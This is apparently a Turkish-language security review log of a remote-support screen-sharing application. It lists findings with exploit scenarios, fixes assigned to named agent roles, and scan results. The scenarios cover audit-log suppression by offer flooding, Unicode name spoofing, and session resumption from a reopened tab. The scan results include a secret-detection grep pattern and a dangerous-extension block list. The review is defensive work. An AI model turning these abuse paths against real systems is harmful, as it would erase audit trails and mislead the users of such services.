  metin değişmez, onay kaydı gösterilen sürüme bağlı. Join→admit arasında yeni sürüm yayımlanırsa müşterinin gördüğü
  sürüm kaydedilir (doğru davranış). Tek `is_current` fonksiyonel UQ ile.
- **Konsol yetkisi:** `/ws/tech` `row.technicianId !== auth.user.id` → 403 (`signaling/ws.ts:99`). Relay yalnız
  `room.tech.peer` ↔ `room.admitted.peer`; kabul edilmemiş misafirden SDP/ICE → 1008. SDP ≤60 KB, ICE ≤2000.
- **Terminate:** `sessions.terminate` yetkisi + `tenantScope` + `terminateActive(tenantId,id)` + audit; aynı TX.
- **Medya yönü:** teknisyen `addTransceiver("video",{direction:"recvonly"})`, hiç iz eklemiyor; misafir `sendonly`,
  `getUserMedia` yok, `audio:false`; Permissions-Policy `camera=() microphone=() display-capture=(self)`.
- **getDisplayMedia** yalnız `share-start` butonu `onClick` → `startShare`; yeniden bağlanmada otomatik paylaşım yok;
  `ended` olayında paylaşım durur; share-strip göstergesi.
- **Kimlik bilgisi saklama:** ticket/reconnect token yalnız bellek + `Sec-WebSocket-Protocol`; URL/depo/log yok; TURN
  credential yalnız `RTCPeerConnection` config'i ve ref'te; token sunucuda resolve edilir, istemci JS'ine verilmez.
- **ICE/IP ifşası:** tarayıcı varsayılanı mDNS host adayları; srflx adayı doğası gereği public IP verir (karşı taraf
  kimliği doğrulanmış teknisyen) — kabul edilmiş risk.
- **CSP/çerçeve:** `frame-ancestors 'none'` + `/session/*` proxy matcher içinde → ekran paylaşım sayfası çerçevelenemez;
  `connect-src 'self' wss://host`; `media-src` gereksiz (`srcObject` URL değil); `referrer: no-referrer`, `noindex`.

### Otomatik tarama çıktıları
- `pnpm audit --audit-level=moderate`: 2 (1 high, 1 moderate) — ikisi de `apps/web > ws@8.18.3` (S-P4-2).
- gitleaks v8.30.1 `dir` (.gitleaks.toml): 10 eşleşme, **tamamı `apps/web/.next/**`** (build çıktısı, preview-props;
  repoya girmez) → kaynakta 0.

### Tasarımda vaat edilip kodda bulunmayanlar
- `ABUSE_EMAIL` env üçlüsü (.env.example/compose/runbook) — S-P4-1.

### Olumlu
Onay modeli DB düzeyinde değişmez ve bileşik FK'lı; tüketim + onay + audit tek TX; nonce kind'ı sunucu kaydından;
relay sınırı sunucuda; misafir kimlik bilgileri bellekte; CSP nonce'lu, `unsafe-inline` yok.

### Öneri: `docs/gereksinimler.md` §9 "Sonra"
S-P4-1 prod açılışından (P10/P13) önce kapanmalı; S-P4-2..4 P5 içinde.

## P4 kod turu 2
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 2 (+2 bilgi). Önceki S-P4-1..4 kapandı.

### Önceki bulguların doğrulaması
| Bulgu | Durum | Kanıt |
|---|---|---|
| S-P4-1 [ORTA] Super Admin e-postası ifşası | KAPANDI | `apps/server/src/public/consent.ts:68-73` — `fromEnv` yoksa ve `superAdminFallback=false` ise DB sorgusu yapılmadan `null`; `sessions/routes.ts:78-79` `superAdminFallback: NODE_ENV !== "production"`. Compose `deploy/docker-compose.yml:98` `ABUSE_EMAIL:` (değersiz geçiş), `.env.example`, runbook §3 güncel. |
| S-P4-2 [DÜŞÜK] web `ws` açığı | KAPANDI | `apps/web/package.json:40` `ws: 8.21.0`; lockfile yalnız `ws@8.21.0`; `pnpm audit --audit-level=moderate` → "No known vulnerabilities found". |
| S-P4-3 [DÜŞÜK] görünmez karakterli ad | KAPANDI (kalan kısım S-P4-T2-1) | `packages/contracts/src/api/sessions.ts:107,114` — `UNSAFE_NAME_CHARS` (C0/C1, U+200B-200F, bidi U+202A-202E/2066-2069, BOM) `refine` ile `.trim()` öncesi kontrol ediliyor; trim ile kenardaki kontrol karakterinin gizlenmesi engellendi. |
| S-P4-4 [DÜŞÜK] sekmede müşteri adı kalması | KAPANDI | `apps/web/lib/session-storage.ts` `clearSessionData()` yalnız `rs.` önekli anahtarları siler, depolama kapalıysa sessiz; `app/(panel)/logout-button.tsx:29` çıkışta çağırıyor; birim testi var. |

### Yeni yüzeyler
- **hello.guestName / hello.share / peer.joined.guestName**: Yalnız `room.tech?.peer.send(...)` ile, aynı odanın teknisyenine gidiyor (`signaling/active.ts:18-28,78`, `rooms.ts:183`); misafire veya başka odaya yayın yok. `guest.name` kaynağı `joinSessionInputSchema` (max 100, kontrol/bidi filtresi) — giden şema da `max(100)` (`contracts/src/ws.ts:90,103`). Web tarafında `dangerouslySetInnerHTML`/`innerHTML` yok; ad React metni olarak basılıyor.
- **share.state spoof**: `onGuestMessage` (`signaling/handlers.ts:83-113`) yalnız `ADMITTED` misafirden ve `guest.peer === peer` iken işliyor; kabul edilmemiş misafir 1008 ile kapatılıyor. Yazılan tek yer `room.share` (kendi odası) ve kendi odasının teknisyeni; `rooms.ts:172` misafir ayrılınca `stopped`'a sıfırlıyor. Şema sıkı: `strictObject`, `monitors ≤16`, `id 0..64`, `name ≤64`, `w/h ≤16384`; çerçeve token bucket'tan geçiyor. Misafir yalnız kendi ekran durumunu "yanlış" bildirebilir — kendi oturumunu etkiler, güvenlik sınırı değil.
- **env.ts `withoutBlanks`** (`apps/server/src/env.ts:68-74`): boş/boşluk değerler tanımsız sayılıyor; prod zorunluları (`TRUSTED_PROXY_CIDR`, `SESSION_REF_KEY`) `refine` ile boşken yine hata veriyor, zorunlu `DATABASE_URL` boşken hata — `test/unit/env-logger.test.ts:27-38` kapsıyor. Hata mesajı yalnız anahtar adı içeriyor.
- **scripts/e2e-real-users.ts**: `NODE_ENV=production` iken çalışmıyor (`:58`); parola/e-posta yalnız env'den (sabit sır yok), parola 12-200 karakter, argon2id hash; yalnız `demo` tenant'ında ve yalnız mevcut ADMIN'e dokunuyor (başka tenant/rol → reddediyor, `:34`); her işlem audit'e yazılıyor. Bkz. S-P4-T2-2.
- **deploy/turn/entrypoint.sh TURN_LISTEN_IPS**: CR/LF içeren değer reddediliyor (config satır enjeksiyonu yok); her öğe `is_ipv4` (tam dize, 4 oktet, 0-255, baştaki sıfır yok) ile doğrulanıyor, aksi `die` (fail closed). Tırnaksız `for ip in $(...)` glob genişlemesi yapabilir ama genişleyen her öğe `is_ipv4`'te düşer → enjeksiyon yok. `auto` yalnız doğrulanmış `PRIVATE_IP` + 127.0.0.1.
- **"Cihaz desteklenmiyor" ekranı** (`apps/web/lib/device-support.ts`): yalnız istemci tarafı UX kontrolü; atlatılması güvenlik etkisi taşımaz, güvenlik sınırı olarak SAYILMAZ (yetki/kabul kontrolleri sunucuda: admit kodu, ADMITTED durumu, public client kontrolü ADR-0012).

### Bulgular
#### S-P4-T2-1 [DÜŞÜK] `UNSAFE_NAME_CHARS` bazı görünmez biçim karakterlerini kapsamıyor — A03/A04 (görüntü sahteciliği)
Yer: `packages/contracts/src/api/sessions.ts:107`
Sorun: U+00AD (soft hyphen), U+034F, U+061C (ALM, bidi), U+180E, U+2028/2029, U+2060-2064 (word joiner, invisible operators), U+FFF9-FFFB, etiket karakterleri U+E0000-E007F listede yok. U+061C bir bidi işaretidir.
İstismar senaryosu: Misafir "Ahmet⁠⁠" veya U+061C ile görünürde aynı/yanıltıcı ad girer; teknisyen konsolunda ve audit'te ad farklı bayt dizisiyle görünür. XSS yok (React metin); etkisi sınırlı kimlik karışıklığı.
Düzeltme: Liste yerine Unicode kategori: `/[\p{Cc}\p{Cf}\p{Zl}\p{Zp}͏᠎]/u` (Cf; ZWJ'li emoji desteklenmeyecekse yeterli). (atanan ajan: backend-dev)

#### S-P4-T2-2 [DÜŞÜK] `e2e-real-users.ts` prod imajında ve korumanın tek kaynağı `NODE_ENV` — A05
Yer: `apps/server/scripts/e2e-real-users.ts:58`; `apps/server/Dockerfile:56` (`COPY ... apps/server` → `scripts/` imaja giriyor)
Sorun: Script operatör aracıdır; prod imajında bulunuyor ve koruma yalnız `NODE_ENV`. Yerel makineden `DATABASE_URL` prod'u gösterecek şekilde (NODE_ENV tanımsız) çalıştırılırsa ve prod'da `demo` tenant'ı varsa (staging-users.sh oluşturur), o tenant'taki ADMIN'lerin parolası sıfırlanır ve `mustChangePassword=false` olur.
İstismar senaryosu: Doğrudan uzaktan istismar yok; operatör hatası / içeriden kötüye kullanım ile yetkili hesap parolası değişir (audit'te `source: e2e-real-users` kalır).
Düzeltme: Ek koruma `E2E_REAL_ALLOW=1` + DB host'unun localhost/staging allowlist'i, veya imajdan `scripts/` hariç tutma (`.dockerignore` / prod-deps aşamasında silme). (atanan ajan: devops)

#### Bilgi
- B-1: `deploy/docker-compose.yml:97` ve runbook §3 (`ABUSE_EMAIL` satırı) "boş dize geçerse server açılmaz" diyor; `withoutBlanks` sonrası bu artık doğru değil (boş = tanımsız). Güvenlik etkisi yok, doküman güncellenmeli (devops/teknik-yazar).
- B-2: `clearSessionData` yalnız çıkış butonunda; oturum süresi dolup 401 ile login'e yönlenmede çağrılmıyor. `sessionStorage` sekme kapanınca silindiği için risk düşük; isteğe bağlı olarak login sayfası yüklenirken de çağrılabilir.

### Otomatik tarama çıktıları
- `pnpm audit --audit-level=moderate` → `No known vulnerabilities found`
- `gitleaks` yerelde kurulu değil (CI'da çalışıyor). Elle tarama: `git grep -nE "(api[_-]?key|secret|password|token)\s*[:=]\s*['\"][^'\"]{8,}"` (test/e2e hariç) ve izlenmeyen yeni dosyalarda (`scripts/`, `src/public`, `src/signaling`, `web/lib`, `playwright.real.config.ts`, `e2e/p4-real.spec.ts`, `deploy/turn`, `contracts/src`) aynı desen → eşleşme yok. `.env.example` diff'i yalnız boş anahtarlar içeriyor. `.gitleaks.toml` allowlist'i yalnız `test/helpers/app.ts` ve `test/helpers/secrets.ts` (sahte değerler).
- `git log --all -- '*.env*'` → yalnız `d90dd2d` (`.env.example`; gerçek `.env` geçmişte yok).

### Olumlu
- S-P4-1 düzeltmesi fail-closed: prod'da DB'ye hiç gidilmiyor.
- Signaling tarafında misafir girdisi her yerde sıkı şema + kabul durumu + peer eşleşmesi ile korunuyor; oda dışına sızma yolu yok.
- entrypoint.sh tüm env değerlerinde satır sonu reddi ve IPv4 tam doğrulaması ile fail-closed.
- Orta/Düşük öneriler `docs/gereksinimler.md` §9'a "Sonra" olarak eklenebilir (S-P4-T2-1, S-P4-T2-2, B-1, B-2).

## P4 kod turu 3 (sayfa testi düzeltmesi: TEST-P4-1 F5 dönüşü, TEST-P4-2)
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 2 (+1 bilgi). Dar kapsam: `apps/web/lib/guest-resume.ts`, `app/session/[token]/{guest-resume-gate,guest-session}.tsx`, `lib/webrtc/use-guest-session.ts`, `apps/server/src/signaling/{ws,rooms,active}.ts`.

### Oturum ele geçirme analizi (backend) — yeni vektör YOK
- **Token tek kullanımlık ve dönüyor:** `active.ts:31-46` `sendHelloGuest` her admit/yeniden bağlanmada eski `reconnectHash`'i siler, yeni token üretir; yeni token yalnız yeni misafir soketine gider. `teardown` (`rooms.ts:227`) haritadan siler.
- **Yarış (iki eşzamanlı reconnect aynı token ile):** `ws.ts:134-147` başarılı yolda `await` yok; `wss.handleUpgrade` (`ws.ts:55`, `verifyClient` yok, `perMessageDeflate:false`) geri çağrıyı eşzamanlı çalıştırır → `bindGuest → reattachGuest → sendHelloGuest` (token rotasyonu) aynı tikte biter. İkinci istek döndürülmüş hash'i bulamaz → 403 `reconnect`. Aynı token iki kez tüketilemez.
- **CLOSING penceresi** (`ws.ts:141` yalnız `isOpen()` çakışma): saldırganın bu pencereden faydalanması için *güncel* reconnectToken'a zaten sahip olması gerekir; bu token'la misafir soketi kapandığı anda (önceki davranış) da devralabilirdi. Sunucu kaynaklı CLOSING yalnız `teardown`'da olur ve o anda oda/hash silinmiştir. Saldırgan misafirin soketini uzaktan CLOSING'e sokamaz. Pencere yeni bir yetki kazandırmıyor.
- `reattachGuest` (`rooms.ts:182-190`) eski peer'ı `detachGuest` ile ayırıyor (`share: stopped`, teknisyene `peer.left`); eski soketin geç `close`'u `guest.peer !== peer` (`rooms.ts:169`) ile etkisiz → durum karışması yok. Devralan taraf ekran paylaşımını otomatik almaz (paylaşım yeniden `getDisplayMedia` tıklaması ister).
- **peer.joined.maxEndsAt:** yalnız aynı odanın teknisyenine (`active.ts sendGuestJoined`), değer sunucu hesaplı (consumedAt + max_active_hours), hassas değil.

### Bulgular
### [DÜŞÜK] S-P4-T3-1 reconnectToken artık sekme deposunda kalıcı — A07 Identification and Authentication Failures / A04
Yer: `apps/web/lib/guest-resume.ts:10-17,58-64`; `app/session/[token]/guest-session.tsx:53-58`
Sorun: Token önceden yalnız bellekteydi; şimdi `sessionStorage['rs.resume.<sha256(link)[:16B]>']`'de. (a) XSS durumunda bellekten de ele geçirilebilirdi, fark küçük; CSP sıkı (`apps/web/proxy.ts:20` `'nonce-…' 'strict-dynamic'`, prod'da `unsafe-inline/eval` yok), web'de `dangerouslySetInnerHTML` yok. (b) Yeni yüzey tarayıcı davranışı: sessionStorage "Sekmeyi çoğalt" ve "Kapatılan sekmeyi yeniden aç" (Ctrl+Shift+T) ile kopyalanır/geri gelir; `window.open` (noopener olmadan) da kopyalar.
İstismar senaryosu: Paylaşılan bilgisayarda müşteri sekmeyi oturumu bitirmeden kapatır; oturum ACTIVE ve misafir soketi kapalıyken aynı makinedeki başka biri sekmeyi geri açar → lobisiz yeniden bağlanır (teknisyene "müşteri döndü" görünür). Etki sınırlı: ekran paylaşımı aynı makinenin ekranıdır ve yeniden tıklama ister; teknisyenin `peer.left/joined` görüp oturumu bitirebilmesi mevcut. Çoğaltılmış sekmede ise orijinal soket OPEN iken 403 conflict alır (devralma yok).
Düzeltme: Kabul edilebilir risk; isteğe bağlı sertleştirme — kayda `savedAt` ekleyip `RECONNECT_WINDOW_MS` (120 sn) aşan kaydı okumamak (F5 için yeterli, sekme geri açma penceresini daraltır); `pagehide` + `persisted=false` olmadan silme gerekmez. (atanan ajan: frontend-dev)

### [DÜŞÜK] S-P4-T3-2 Dönüş deneme penceresi sunucu ölü-soket süresinden kısa; her deneme audit satırı — A09 Security Logging and Monitoring Failures
Yer: `apps/web/lib/webrtc/use-guest-session.ts:20-21,96-106`; `apps/server/src/signaling/ws.ts:141-143,176-184`
Sorun: Sunucu ölü soketi en geç ~90 sn'de düşürür (30 sn ping, `missed >= 2` → 3. tikte `terminate`), istemci 20 × 3 sn ≈ 60 sn (+ status gecikmesi) dener → çökme/ağ kopmasında meşru dönüş `resumeFailed` olabilir (işlevsel). Ayrıca her 403 conflict `reconnect.conflict` audit satırı yazar: tek F5 için ≤ 20 satır. DoS açısından sınırlı: WS upgrade `guestIp` 31/dk/IP (`ws.ts:59`), status `statusIp` 60/dk/IP (`sessions/public.ts:121,213`); istemci 3 sn'de 1 upgrade + 1 status = 20/dk, limitlerin altında; 429 da yeniden denemeyi durdurmaz ama aralık sabit 3 sn, sınırlı (20).
İstismar senaryosu: Geçerli token sahibi biri (yalnız müşterinin kendisi) audit tablosunu dakikada ≤ 31 satırla doldurabilir — IP limitiyle sınırlı, yetki kazancı yok.
Düzeltme: backend-dev — `reconnect.conflict` audit'ini oda başına dakikada 1 ile tekilleştir (sayaç metrikte kalsın). frontend-dev — `RESUME_MAX_ATTEMPTS × RESUME_RETRY_MS`'i sunucu `pingMs × 3` + pay (≥ 100 sn, `RECONNECT_WINDOW_MS` 120 sn içinde) ile hizala.

### [BİLGİ] G-01 / G-13 ile uyum
- Depoya yazılan alanlar: `reconnectToken`, `technicianName`, `customerName`, `verifyCode`, `sessionRef` (zod şemalı, uzunluk sınırlı; bozuk kayıt silinir — `guest-resume.ts:45-56`). Link token'ı yazılmaz, anahtar SHA-256 önekidir (aynı origin'de başka link/oturumla karışma yok; 128 bit önek çakışması pratikte imkânsız).
- G-01: reconnectToken yalnız admit sonrası `hello`'dan gelir ve yalnız `state.reconnectToken` doluyken yazılır → lobi/kabul öncesi depoda token yok. `verifyCode` = `techVerifyCode` (müşterinin teknisyeni teyidi; resolve'da zaten müşteriye gösterilir, müşteriyi doğrulamaz) → gizli değil. `sessionRef` opak, status ucu yalnız `{status}` döner.
- G-13: TURN credential/iceServers depoya yazılmıyor (dönüşte `hello` yenisini verir). Çelişki yok.
- Silme: `ended` fazında (`guest-session.tsx:54`), `consumed` dışı sonlarda (`guest-resume-gate.tsx:30`), panel çıkışında `clearSessionData` (`rs.` öneki). Token URL/log'a yazılmıyor; WS'de `Sec-WebSocket-Protocol` ile gidiyor (Caddy logunda yazılmıyor, G-10).

### Öneri (`docs/gereksinimler.md` §9 "Sonra")
S-P4-T3-1 (kayda süre damgası), S-P4-T3-2 (conflict audit tekilleştirme + deneme penceresi hizalama).

---

## P5 kod turu 1 (sohbet, dosya transferi, işaretleme, kalite özeti)
Tarih: 2026-11-11 · Kapsam: `packages/contracts/src/{files,dc,ws}.ts`, `apps/server/src/signaling/{collab,handlers}.ts`, `apps/web/lib/dc/*`, `components/collab/*`, `components/guest/guest-collab.tsx`, `use-quality`, migration `20261111040000_p5_session_files`, `grants.sql`
DURUM: DÜZELTİLMELİ
Özet: Kritik 0 / Yüksek 1 / Orta 2 / Düşük 5

### [YÜKSEK] S-P5-1 Teklif seliyle `file.meta` kotası tüketilip gerçek transferin audit kaydı düşürülebiliyor — A09 Security Logging and Monitoring Failures
Yer: `apps/server/src/signaling/collab.ts:25-36,59-64` (oda başına ortak 20/dk + 500/oturum sayaç); `apps/web/lib/dc/files.ts:243-259` (her otomatik ret → `file.meta REJECTED`); `apps/web/lib/dc/use-collab.ts:60` (gelen ctl'de hız sınırı yok)
Sorun: Hız sınırı oda geneli ve sonuçtan bağımsız. Otomatik retler (busy/cooldown/tooLarge/caps) de kotadan yer. Gönderen taraf, alıcının istemcisine sınırsız `file.offer` yollayarak alıcının sunucuya `file.meta` göndermesini tetikleyebilir. Kota dolunca sonraki `OK` raporu `RATE_LIMITED` alıyor ve `session_files` ile `audit_logs`'a hiçbir şey yazılmıyor. Geride yalnız bir log uyarısı kalıyor.
İstismar senaryosu: Kötü niyetli bir teknisyen (içeriden tehdit) müşteriye A dosyasını teklif ediyor (müşteride "pending"). Ardından DC üzerinden 20 sahte teklif daha yolluyor. Müşteri istemcisi bunları "busy" olarak otomatik reddediyor ve 20 `file.meta` gönderiyor, böylece dakikalık pencere doluyor. Müşteri 60 sn içinde A'yı kabul ediyor. Transfer bitince gelen `OK` meta kaydı reddediliyor. Sonuç: müşteriye gönderilen (zararlı olabilecek) dosyanın adı ve SHA-256'sı hiçbir kayıtta yok. AC-55 ve audit zorunluluğu delinmiş oluyor. Aynı yolla 500/oturum kotası tüketilerek oturumun geri kalanı tamamen kayıtsız kalabilir.
Düzeltme: backend-dev: Kotayı sonuca göre ayırın. `OK`/`CORRUPT` (kabul edilmiş transferin sonucu) hiç düşürülmemeli ya da ayrı ve yüksek bir kotası olmalı. `REJECTED`/`CANCELLED` ayrı bir kotayla sınırlanmalı. Kota aşıldığında oturum başına bir kez `file.meta_rate_limited` audit satırı yazılmalı (sessiz kayıp olmamalı). frontend-dev: Alıcı istemci, otomatik retlerde `file.meta`'yı tekilleştirmeli/özetlemeli (ör. 10 sn'de en çok 1). Gelen `file.offer` için alıcı tarafında hız sınırı konmalı (ör. 5/10 sn, aşanlar sessizce düşer). Bu testle doğrulanmalı (21 teklif + 1 OK → OK kaydı var).

### [ORTA] S-P5-2 Teklif seli karşı tarafın WS bağlantısını 1008 ile kopartıyor ve listeyi sınırsız büyütüyor — A04 Insecure Design (DoS)
Yer: `apps/web/lib/dc/files.ts:230-262` (`inc` Map ve `list` sınırsız); `apps/server/src/signaling/handlers.ts:17,42` (TokenBucket 50/sn, aşımda `peer.close(POLICY)`)
Sorun: DC `ctl` kanalında alıcı tarafta hız sınırı yok. Saniyede 50'den fazla teklif gelirse alıcı da saniyede 50'den fazla `file.meta` WS mesajı üretiyor (amplifikasyon). Sunucu, kurban tarafın soketini `ws_rate_exceeded` ile kapatıyor. Ayrıca her otomatik ret `list`'e ekleniyor (caps dışındakiler), bu da React render ve bellek yükünü sınırsız büyütüyor.
İstismar senaryosu: Kabul edilmiş müşteri (veya teknisyen), değiştirilmiş istemciyle döngüde `file.offer` yolluyor. Karşı tarafın WS'i kopuyor ve sinyalizasyon/ICE restart çalışmıyor. Sekme, binlerce satırlık listeyle yavaşlıyor. Kalıcı yetki kazancı yok. Ancak meşru tarafı "bağlantı koptu" durumuna düşürüyor ve S-P5-1'i besliyor.
Düzeltme: frontend-dev: S-P5-1'deki alıcı tarafı teklif sınırı. Aşımda `file.meta` gönderilmemeli ve `list`'e eklenmemeli. Otomatik ret kayıtları `list`'te en çok N (ör. 20) tutulmalı. Aynı zamanda `chat`/`annot.*` için de alıcı tarafı sınırı konmalı (bkz. S-P5-6). Sunucu tarafında değişiklik gerekmiyor (bucket doğru çalışıyor; sorun istemcinin karşı tarafın girdisini WS'e yansıtması).

### [ORTA] S-P5-3 `TO_TECH` kaydının tek kaynağı teknisyen istemcisi; değiştirilmiş konsol müşteriden dosya alıp hiç raporlamayabilir — A09 / A04
Yer: `apps/server/src/signaling/collab.ts:47-52` (gönderen raporu yok sayılıyor; tek kaynak alıcı); `packages/contracts/src/ws.ts` `fileMetaSchema` yorumu
Sorun: İçerik P2P aktığı için sunucu transferi göremiyor. `TO_TECH` yönünde rapor yalnız teknisyenden kabul ediliyor. Müşteri tarafının (gönderen) raporu atılıyor. İçeriden kötü niyetli bir teknisyen, `file.meta` göndermeyen bir konsolla müşteriden veri çekebilir ve hiçbir iz kalmaz. Bu, A09'un "denetlenen kişinin kendi kaydını yazması" durumudur.
İstismar senaryosu: Teknisyen tarayıcı konsolunda `sendMeta`'yı no-op yapıyor ve müşteriye "şu log dosyasını gönderin" diyor. `session_files`/`audit_logs` boş kalıyor.
Düzeltme: mimar + backend-dev: Gönderenin raporu da ayrı bir alan/satır olarak kaydedilmeli (ör. `reporter` = `sender|receiver`). Sunucu, alıcı raporu yoksa en azından gönderenin "offer/done" iddiasını audit'e yazmalı. Müşteri istemcisi değiştirilmemiş varsayıldığından bu, teknisyene karşı güvenilir iz sağlar. Mimari §4'te tasarım sapması/risk kabulü olarak işlenmeli.

### [DÜŞÜK] S-P5-4 Alınan dosya tamamen bellekte; SHA-256 için ikinci kopya — A04 (istemci DoS)
Yer: `apps/web/lib/dc/files.ts:279,287-289` (`chunks[]` → `Blob` → `sha256Hex` içinde `blob.arrayBuffer()`); gönderen `files.ts:161` (`sha256Hex(file)` dosyanın tamamını okuyor)
Sorun: Tenant sınırı 2048 MiB'a kadar çıkabiliyor. Bu durumda alıcıda yaklaşık 2× dosya boyutu RAM gerekiyor, `arrayBuffer()` ≥ 2 GB'ta hata verip sekmeyi çökertebilir. Gönderen de aynı şekilde etkileniyor. Kullanıcı kabulü gerektiği ve varsayılan 100 MB olduğu için düşük.
Düzeltme: frontend-dev: Artımlı özet (ör. `hash-wasm` veya parça parça SHA-256), alıcıda `chunks` yerine OPFS/`FileSystemWritableFileStream` (destek yoksa ≤ 256 MB üst sınır). Kısa vadede UI'da tenant sınırı 512 MB üzerindeyse uyarı gösterilebilir.

### [DÜŞÜK] S-P5-5 İndirme Blob'u MIME türü olmadan oluşturuluyor — A05 Security Misconfiguration
Yer: `apps/web/lib/dc/files.ts:287,291`; `components/collab/files-panel.tsx:42`
Sorun: `new Blob(chunks)` → `type=""`. `download` özniteliği tıklamada dosyayı indiriyor, ama kullanıcı bağlantıyı "Yeni sekmede aç" ile açarsa `blob:` URL'si uygulama origin'inde gezinir. Bu durumda tarayıcı türü koklayarak (sniffing) HTML/SVG içeriği belge olarak çizebilir. CSP (nonce + strict-dynamic, `proxy.ts:20`) blob belgelerine miras kaldığı için betik çalışması bugün engelleniyor. Ancak HTML ile oltalama/sahte form çizilebilir.
Düzeltme: frontend-dev: `new Blob(chunks, { type: "application/octet-stream" })`. İndirme bağlantısında tehlikeli/çift uzantı uyarısı da tekrar gösterilmeli (şu an yalnız kabul diyaloğunda).

### [DÜŞÜK] S-P5-6 Gelen `chat` / `annot.*` için alıcı tarafında hız sınırı yok — A04
Yer: `apps/web/lib/dc/use-collab.ts:57,62`; `lib/dc/annot.ts:58,64`; `lib/dc/chat.ts:31-32`
Sorun: Protokolde lazer için 30/sn tanımlı, ama yalnız gönderen uyguluyor. `MAX_STROKES` 200 × 500 nokta tavanı ve `CHAT_KEEP` 500 belleği sınırlıyor. Ancak her mesaj tam yeniden çizim/render tetikliyor ve chat yineleme kontrolü O(n). Değiştirilmiş teknisyen istemcisi müşteri sekmesini kilitleyebilir.
Düzeltme: frontend-dev: Alıcıda token bucket uygulanmalı (chat 5/sn, stroke 20/sn, laser 30/sn), aşanlar düşürülmeli.

### [DÜŞÜK] S-P5-7 Tehlikeli uzantı listesi ve Windows ayrılmış ad kapsamında boşluklar — A04
Yer: `packages/contracts/src/files.ts:15,46-50`
Sorun: Listede şunlar yok: `vbe, jse, ws, wsh, msp, mst, inf, ps1xml, psd1, psc1, settingcontent-ms, library-ms, searchconnector-ms, xlam, pptm, dotm, xla, gadget, html, htm, mht, svg` (son dördü tarayıcıda açılıp HTML smuggling/oltalama için kullanılır). `RESERVED` regex'i `CONIN$`, `CONOUT$` ve üst simge rakamlı `COM¹-³`/`LPT¹-³` adlarını kapsamıyor (Windows bunları da ayrılmış sayar). Yol geçişi, RTLO/Cf, sondaki nokta/boşluk, ADS `:` ve uzunluk doğru ele alınıyor. DB CHECK aynı kuralı tekrarlıyor.
Düzeltme: frontend-dev/backend-dev (contracts + fixtures + Go eşi birlikte): listeyi genişletin, regex'i `^(CON|PRN|AUX|NUL|CONIN\$|CONOUT\$|COM[1-9¹²³]|LPT[1-9¹²³])$` yapın.

### [DÜŞÜK] S-P5-8 JS `\p{Cf}` ile MySQL ICU `\p{Cf}` sürüm farkı `file.meta` yazımını düşürebilir — A09
Yer: `collab.ts:66,81-86`; migration `session_files_file_name_chk`
Sorun: Node ve MySQL farklı Unicode sürümleri kullanıyor. Yeni eklenen bir Cf karakteri bir tarafta silinir, diğerinde silinmezse CHECK 3819 hatası verir ve TX geri alınır. Bu durumda kayıt ve audit olmuyor, yalnız log kalıyor (sessiz kayıp, S-P5-1 ile aynı sonuç).
Düzeltme: backend-dev: CHECK hatasında adı `FILE_NAME_FALLBACK` ile değiştirip yeniden yazın (kayıt kaybolmasın) ve metrik artırın.

### Doğrulanan/olumlu (P5)
- **Sunucu `file.meta`:** caps (`file_transfer`) kontrolü `room.caps` üzerinden yapılıyor (sunucu hesaplı, admit anında). Yalnız alıcı tarafın raporu kabul ediliyor. Misafir için `ADMITTED`, teknisyen için `room.admitted` şartı var. Ad sunucuda yeniden temizleniyor. `OK` raporunda tenant sınırı kontrol ediliyor. `session_files` + `audit_logs` tek TX'te yazılıyor. `tenantId`/`sessionId` istemciden değil oda durumundan geliyor (tenant izolasyonu tamam). Hata yanıtında stack/SQL yok (ref'li log).
- **`quality.summary`:** yalnız teknisyenden kabul ediliyor, zod ile sınırlı sayılar ve enum, 5 sn yazma aralığı, 4 KB tavan. `updateMany` `tenantId + consumedAt not null` filtreli. DB CHECK ile eşleşiyor.
- **DC şemaları:** strict, `ctl` 16 KB, chat 2000 karakter, stroke 500 nokta, koordinatlar [0,1], `idx` uint16, sha256 regex, boyut tavanı. Çerçeve çözümlemede boyut kontrolü yapılıyor. `FileReceiveGuard` beyana güvenmiyor (`min(declared, max)`), sıra dışı parçada iptal ediyor, tamamlanma = alınan baytın beyana eşitliği, ardından SHA-256 eşleşmesi. Bozuk dosya sunulmuyor.
- **Kabul diyaloğu:** otomatik kabul yok. 1,5 sn sonra etkinleşme fid başına ayrı. Varsayılan odak "Reddet". Esc reddediyor. Tek bekleyen teklif var, diğerleri "busy" olarak reddediliyor. 30 sn ret bekleme süresi uygulanıyor. Tehlikeli/çift uzantı uyarısı gösteriliyor. İndirme adı temizlenmiş ad (`download={x.name}`). Object URL'ler `dispose`'ta bırakılıyor.
- **Chat XSS:** React metin düğümü kullanılıyor. `apps/web` içinde `dangerouslySetInnerHTML`/`innerHTML`/`eval` yok. Document PiP yalnız aynı origin stil düğümlerini kopyalıyor, dış içerik enjekte etmiyor.
- **Caps yokken düşürme:** güvenlik sınırı her iki uçta değiştirilmemiş kurban istemcisinde (müşteri: sunucunun `hello.caps`'i; konsol: kendi yetkisi) ve sunucuda meta için uygulanıyor. İçerik sunucudan geçmediği için bu, mimariyle uyumlu.
- **Kapanan P4 bulguları:** **S-P4-T3-1 kapandı.** `savedAt` + 120 sn, gelecek damga toleransı 5 sn, canlı oturumda 30 sn'de bir ve `pagehide`'da tazeleniyor (`guest-resume.ts`, `guest-session.tsx:60-70`). **S-P4-T3-2 kapandı.** 35 × 3 sn = 105 sn, `reconnect.conflict` audit'i oda başına dakikada 1 (`ws.ts:23,149`).
- **Migration/grants:** `app` için `session_files` yalnız SELECT/INSERT (append-only, REVOKE ile). CHECK'ler yön/sonuç/sha/boyut/ad için tanımlı. FK `(session_id, tenant_id)` bileşik, bu da çapraz tenant satırını DB'de engelliyor. Dosya içeriği tabloda yok.

### Otomatik tarama (P5)
- `pnpm audit --audit-level=moderate` → "No known vulnerabilities found".
- Sır taraması (`git diff` + izlenmeyen tüm yeni dosyalar, api_key/secret/password/token/özel anahtar/AKIA/ghp_ kalıpları) → eşleşme yok.
- `git log --all -- '*.env*'` → yalnız `.env.example`.

### Öneri (`docs/gereksinimler.md` §9 "Sonra")
S-P5-4 (akışlı özet/OPFS), S-P5-6 (alıcı tarafı hız sınırı), S-P5-7 (uzantı listesi), S-P5-8 (CHECK geri dönüşü). S-P5-1 bu turda düzeltilmeli. S-P5-2 ve S-P5-3 tercihen bu pakette düzeltilmeli; S-P5-3 için en azından mimariye risk kabulü yazılmalı.

---

